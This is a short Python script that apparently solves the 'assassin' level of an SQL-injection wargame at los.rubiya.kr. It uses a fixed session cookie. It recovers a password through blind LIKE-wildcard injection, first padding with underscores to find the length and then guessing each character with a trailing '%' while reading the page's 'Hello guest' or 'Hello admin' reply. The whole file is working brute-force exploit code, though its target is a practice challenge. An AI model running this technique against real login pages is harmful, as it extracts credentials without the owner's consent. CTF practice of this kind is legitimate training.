import requests
import string


def get(pw):
    return requests.get(
        'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php',
        params={"pw":pw},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

# get length
length = 1
while True:
    print("Try length", length)
    if "<h2>Hello guest</h2>" in get('_' * length):
        break
    length += 1
print("Length is", length)

# get password
password = ''
for index in range(length):
    tmp = ''
    for c in string.ascii_letters + string.digits:
        print("Try", password+c)
        resp = get(password + c + '%')
        if "<h2>Hello guest</h2>" in resp:
            tmp = c
            continue

        if "<h2>Hello admin</h2>" in resp:
            password += c
            break
    else:
        password += tmp
    print(password)

# password is 

# certify
print(get(password))